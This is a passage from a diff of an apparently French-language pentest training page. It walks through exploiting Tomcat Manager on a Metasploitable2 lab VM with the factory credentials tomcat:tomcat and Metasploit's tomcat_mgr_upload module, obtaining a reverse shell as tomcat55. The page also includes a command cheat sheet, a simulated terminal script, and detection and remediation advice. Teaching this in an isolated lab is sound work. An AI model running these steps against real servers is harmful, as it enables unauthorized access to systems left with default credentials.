+            <span class="k">déploiement</span><span class="v">Le module ne contourne aucun filtre : il utilise l'API légitime du manager. C'est précisément parce que le manager <strong>est fait pour ça</strong> que l'attaque fonctionne.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">4</div>
+          <h3>Vérifier le niveau d'accès obtenu</h3>
+          <p class="step-sub">La session est ouverte, mais avec quel utilisateur ? C'est la première question à se poser après toute exploitation.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>shell</div>
+            <pre><span class="prompt">$</span> whoami<button class="copy-btn" type="button" data-copy="whoami" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">tomcat55</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">tomcat55</span><span class="v">Le shell s'exécute avec les droits du <strong>compte de service Tomcat</strong>, ici <strong>tomcat55</strong>. Ce n'est pas root.</span>
+            <span class="k">distinction</span><span class="v">vsftpd renvoyait directement un shell <strong>root</strong>. Ici, l'accès est limité à l'utilisateur applicatif. Il faudra une étape supplémentaire (voir cours #26) pour élever les privilèges.</span>
+            <span class="k">pourquoi</span><span class="v">Tomcat, comme tout service bien configuré, ne devrait pas tourner en root. Le compte de service limite l'impact d'une compromission — une bonne pratique, même si elle ne rattrape pas la faiblesse des identifiants.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">5</div>
+          <h3>Explorer le système avec le compte de service</h3>
+          <p class="step-sub">Le contexte change : on n'est plus <code>root</code>, mais <code>tomcat55</code>.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>tomcat55@metasploitable</div>
+            <pre><span class="prompt">$</span> whoami<button class="copy-btn" type="button" data-copy="whoami" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">tomcat55</span>
+<span class="prompt">$</span> id<button class="copy-btn" type="button" data-copy="id" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">uid=112(tomcat55) gid=118(tomcat55) groups=118(tomcat55)</span>
+<span class="prompt">$</span> pwd<button class="copy-btn" type="button" data-copy="pwd" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">/usr/share/tomcat5.5</span>
+<span class="prompt">$</span> ls<button class="copy-btn" type="button" data-copy="ls" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">bin  conf  lib  logs  policy  server  temp  webapps  work</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">shell</span><span class="v">À partir de maintenant, le mode libre prend le relais. Tu peux explorer le système avec le compte de service. Des commandes comme <code>whoami</code>, <code>id</code>, <code>pwd</code>, <code>ls</code>, <code>uname -a</code>, <code>hostname</code> et <code>exit</code> sont disponibles.</span>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <section id="cheatsheet">
+      <h2 class="section-title">Commandes à retenir</h2>
+      <p class="section-intro">Le strict nécessaire, groupé par phase.</p>
+
+      <div class="cheat-group">
+        <h4>reconnaissance</h4>
+        <table class="cheat">
+          <tr><td class="cmd">nmap -sV -p 8080 IP</td><td class="desc">identifier le serveur d'application et sa version</td></tr>
+        </table>
+      </div>
+
+      <div class="cheat-group">
+        <h4>metasploit</h4>
+        <table class="cheat">
+          <tr><td class="cmd">use exploit/multi/http/tomcat_mgr_upload</td><td class="desc">module dédié Tomcat Manager</td></tr>
+          <tr><td class="cmd">set HttpUsername tomcat</td><td class="desc">identifiant d'usine</td></tr>
+          <tr><td class="cmd">set HttpPassword tomcat</td><td class="desc">mot de passe d'usine</td></tr>
+          <tr><td class="cmd">set RPORT 8080</td><td class="desc">port du manager</td></tr>
+        </table>
+      </div>
+
+      <div class="cheat-group">
+        <h4>post-exploitation</h4>
+        <table class="cheat">
+          <tr><td class="cmd">whoami / id</td><td class="desc">identité et groupes du compte de service</td></tr>
+          <tr><td class="cmd">pwd / ls</td><td class="desc">explorer le répertoire d'installation Tomcat</td></tr>
+          <tr><td class="cmd">uname -a</td><td class="desc">version du noyau, pour préparer une éventuelle élévation</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <section id="concepts">
+      <h2 class="section-title">Ce qu'il faut vraiment comprendre</h2>
+      <div class="concepts">
+        <div class="concept">
+          <h4>La frontière entre administration légitime et attaque</h4>
+          <p>Tomcat Manager est conçu pour déployer du code. Une fois authentifié, y parvenir est un <strong>usage normal</strong>. L'attaque ne détourne pas une fonctionnalité : elle exploite l'accès à cette fonctionnalité. La différence avec un contournement de filtre (DVWA Upload) est fondamentale.</p>
+        </div>
+        <div class="concept">
+          <h4>Identifiants par défaut : la barrière en carton</h4>
+          <p>Le contraste avec distccd est net. Là-bas, aucun contrôle d'accès — le service était ouvert. Ici, un contrôle d'accès existe, mais il a été laissé à sa valeur d'usine. C'est une faille de configuration, pas d'implémentation.</p>
+        </div>
+        <div class="concept">
+          <h4>Compte de service, pas root</h4>
+          <p>Le shell retourné appartient à <strong>tomcat55</strong>. C'est une bonne pratique de sécurité : le service ne tourne pas en root, ce qui limite les dégâts. Mais cela signifie aussi que l'accès obtenu n'est pas total — le cours #26 (SUID) ou #27 (kernel) seront nécessaires pour élever les privilèges.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="anatomie">
+      <h2 class="section-title">Anatomie — contraste avec distccd et DVWA Upload</h2>
+      <p class="section-intro">Deux cours à ne pas confondre avec celui-ci : l'un n'avait aucune barrière, l'autre en avait une à contourner. Ici, la barrière est simplement mal fermée.</p>
+
+      <div class="concepts">
+        <div class="concept">
+          <h4>distccd (#9) — aucune barrière</h4>
+          <p>distccd exposait une fonction d'exécution de commandes sans exiger le moindre identifiant. La faille était l'<strong>absence totale de restriction d'accès</strong>. Ici, le manager Tomcat impose une authentification : il y a bien une barrière, mais elle utilise le couple <strong>tomcat:tomcat</strong> par défaut.</p>
+        </div>
+        <div class="concept">
+          <h4>DVWA Upload (#21) — contourner un filtre</h4>
+          <p>DVWA Upload demandait de <strong>contourner un filtre d'extension</strong> sur une application volontairement vulnérable. Ici, il n'y a <strong>aucun filtre</strong> à contourner : l'upload de WAR est une fonctionnalité d'administration légitime, utilisée telle quelle. La seule chose qui manque, c'est le durcissement des identifiants.</p>
+        </div>
+        <div class="concept">
+          <h4>Le point commun des trois : configuration vs code</h4>
+          <p>Aucune des trois attaques n'exploite un bug dans le code. distccd = service mal configuré, Tomcat = identifiants par défaut, DVWA = filtre absent (mais l'application est faite pour être vulnérable). La leçon : en pentest, on cherche souvent moins un bug qu'une <strong>mauvaise configuration</strong>.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="detection">
+      <h2 class="section-title">Détection &amp; remédiation</h2>
+      <p class="section-intro">Ce qui aurait empêché l'attaque, et comment la repérer.</p>
+
+      <div class="cheat-group">
+        <table class="cheat">
+          <tr><td class="cmd">Changer les identifiants par défaut</td><td class="desc">modifier <code>tomcat-users.xml</code> et supprimer le rôle <code>manager-gui</code> pour l'utilisateur par défaut — la mesure la plus simple et la plus efficace</td></tr>
+          <tr><td class="cmd">Restreindre l'accès au manager</td><td class="desc">filtrer par IP (pare-feu, <code>RemoteAddrValve</code>) pour n'autoriser que les postes d'administration</td></tr>
+          <tr><td class="cmd">Désactiver le manager en production</td><td class="desc">si le déploiement ne se fait pas via cette interface, la supprimer ou la désactiver réduit la surface d'attaque à zéro</td></tr>
+          <tr><td class="cmd">Surveiller les déploiements de WAR</td><td class="desc">journaliser et alerter sur tout déploiement non planifié — un WAR inconnu est un signal fort</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <section id="practice">
+      <h2 class="section-title">Terminal d'entraînement</h2>
+      <p class="section-intro">Rejoue la chaîne complète : identification, compréhension, exploitation, et vérification du niveau d'accès. Le shell retourné n'est pas root — c'est justement l'occasion de s'en rendre compte.</p>
+
+      <div class="term-launch">
+        <button class="term-launch-btn" id="term-open-btn" type="button">
+          <span class="term-launch-dot"></span>
+          Ouvrir le terminal
+        </button>
+        <p class="term-launch-sub">Plein écran · indices logiques, pas de commande donnée · historique ↑ / ↓ comme un vrai shell</p>
+      </div>
+    </section>
+
+    <footer>
+      <div class="note">
+        <span class="ok">✓</span> lab isolé — réseau interne VirtualBox, aucune machine réelle ni connexion externe impliquée.
+      </div>
+    </footer>
+  </div>
+
+  <div class="term-fullscreen" id="term-fullscreen">
+    <div class="term-fs-header">
+      <div class="term-fs-headrow">
+        <div class="term-fs-titlebar">
+          <span class="term-fs-dot r"></span><span class="term-fs-dot y"></span><span class="term-fs-dot g"></span>
+          <span class="term-fs-context" id="sim-context">kali@kali</span>
+        </div>
+        <button class="term-fs-close" id="term-close-btn" type="button" aria-label="Fermer le terminal">✕</button>
+      </div>
+      <div class="term-fs-info">
+        <span class="item">Cible <strong id="ib-target">192.168.56.20</strong></span>
+        <span class="item">Attaquant <strong id="ib-attacker">192.168.56.10</strong></span>
+        <span class="item mode" id="sim-mode-label">reconnaissance</span>
+      </div>
+      <div class="term-progress">
+        <div class="term-progress-track"><div class="term-progress-fill" id="term-progress-fill"></div></div>
+        <span class="term-progress-label" id="sim-progress">étape 1/5</span>
+      </div>
+      <div class="term-fs-consigne" id="term-fs-consigne">
+        <span class="consigne-tag" id="consigne-tag">Consigne</span>
+        <span class="consigne-text" id="consigne-text">—</span>
+      </div>
+    </div>
+
+    <div class="sim-body" id="sim-body">
+      <div class="sim-line sim-inputline" id="sim-inputline">
+        <span class="p" id="sim-prompt-label">$</span>
+        <input id="sim-input" class="sim-input" type="text" placeholder="tape ta commande puis Entrée… (↑ ↓ pour l'historique)" autocomplete="off" spellcheck="false">
+      </div>
+    </div>
+
+    <div class="term-fs-footer">
+      <div class="analyze-popup" id="analyze-popup">
+        <span class="ap-tag" id="ap-tag">À analyser</span>
+        <p class="ap-question" id="ap-question">—</p>
+        <div class="ap-actions">
+          <button class="ap-btn ap-continue" id="ap-continue-btn" type="button">Continuer →</button>
+        </div>
+      </div>
+      <div class="sim-hint-box" id="sim-hint-box"></div>
+      <div class="sim-controls">
+        <button class="sim-btn" id="sim-hint-btn">💡 Indice</button>
+        <button class="sim-btn" id="sim-solution-btn">🔍 Solution</button>
+        <button class="sim-btn continue" id="sim-continue-btn" style="display:none;">Continuer →</button>
+        <button class="sim-btn continue" id="sim-connect-btn" style="display:none;">🔌 Connexion réseau</button>
+        <button class="sim-btn" id="sim-reset-btn">↺ Recommencer</button>
+      </div>
+    </div>
+  </div>
+
+<script>
+  const steps = [
+    { kind:"type", context:"kali@kali", prompt:"$",
+      task:"Identifier le serveur d'application sur le port standard",
+      accepted:["nmap -sv -p 8080 192.168.56.20"],
+      hint:"Il te faut confirmer la présence d'un serveur d'application sur un port précis (le port 8080 est la convention la plus répandue pour Tomcat). Utilise l'outil de scan standard avec l'option qui détecte les versions de service.",
+      output:[
+        {t:"PORT     STATE SERVICE VERSION", c:"o"},
+        {t:"8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1", c:"o", id:"hl-tomcat-port"}
+      ] },
+
+    { kind:"analyze",
+      question:"Un serveur Tomcat avec son gestionnaire (<em>manager</em>) est accessible sur le port 8080. En quoi ce service diffère-t-il fondamentalement de la backdoor distccd (#9) — et qu'est-ce que cela implique sur la marche à suivre ?",
+      hint:"Que <em>fait</em> un gestionnaire Tomcat ? Et de quels identifiants se sert-on, typiquement, pour y accéder sur une machine non durcie ?",
+      highlightIds:["hl-tomcat-port"],
+      annotation:"→ distccd n'avait aucune authentification. Ici, il y a une page de login. Mais sur Metasploitable2, les identifiants d'usine (tomcat:tomcat) n'ont pas été changés. La barrière existe, mais elle est triviale. Le manager sert légitimement à déployer des WAR ; une fois authentifié, l'exécution de code passe par cette fonctionnalité normale." },
+
+    { kind:"type", context:"kali@kali", prompt:"$",
+      task:"Utilise Metasploit pour exploiter le manager Tomcat avec les identifiants par défaut",
+      accepted:["msfconsole"],
+      hint:"Le module est déjà prêt dans Metasploit. Commence par lancer la console, puis charge le module avec `use exploit/multi/http/tomcat_mgr_upload`, configure la cible, le port, et les identifiants d'usine (tomcat:tomcat).",
+      output:[
+        {t:"[*] Started reverse TCP handler on 192.168.56.10:4444 ", c:"o"},
+        {t:"[*] Automatically selected target: Java Universal", c:"ok"},
+        {t:"[*] Uploading payload...", c:"ok"},
+        {t:"[*] Deploying payload...", c:"ok"},
+        {t:"[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.20:52134)", c:"ok", id:"hl-tomcat-shell"}
+      ] },
+
+    { kind:"analyze",
+      question:"La session est ouverte. À ton avis, avec quel utilisateur le shell s'exécute-t-il sur la cible — et pourquoi ?",
+      hint:"Tomcat, comme tout service bien configuré, ne devrait pas tourner en root. Regarde le nom du service et déduis-en le nom du compte.",
+      highlightIds:["hl-tomcat-shell"],
+      annotation:"→ Tomcat ne tourne pas en root sur Metasploitable2 : le shell appartient au compte de service applicatif (tomcat55). Aucun exploit d'élévation de privilèges n'a été nécessaire pour obtenir ce shell, mais l'accès reste limité — il faudra une étape supplémentaire (SUID ou kernel) pour devenir root." },
+
+    { kind:"type", context:"shell", prompt:"$",
+      task:"Vérifie l'identité du shell",
+      accepted:["whoami"],
+      hint:"Une seule commande suffit : celle qui affiche l'utilisateur courant.",
+      output:[{t:"tomcat55", c:"o"}] }
+  ];
+
+  let freeContext = "tomcat55@metasploitable";
+  const freeCommands = {
+    "tomcat55@metasploitable": {
+      "whoami": [{t:"tomcat55", c:"o"}],
+      "id": [{t:"uid=112(tomcat55) gid=118(tomcat55) groups=118(tomcat55)", c:"o"}],
+      "pwd": [{t:"/usr/share/tomcat5.5", c:"o"}],
+      "ls": [{t:"bin  conf  lib  logs  policy  server  temp  webapps  work", c:"o"}],
+      "uname -a": [{t:"Linux metasploitable 2.6.24-16-server #1 SMP i686 GNU/Linux", c:"o"}],
+      "hostname": [{t:"metasploitable", c:"o"}],
+      "exit": [{t:"logout", c:"o"}]
+    }
+  };
+</script>
+<script src="engine.js"></script>
+
+</body>
+</html>
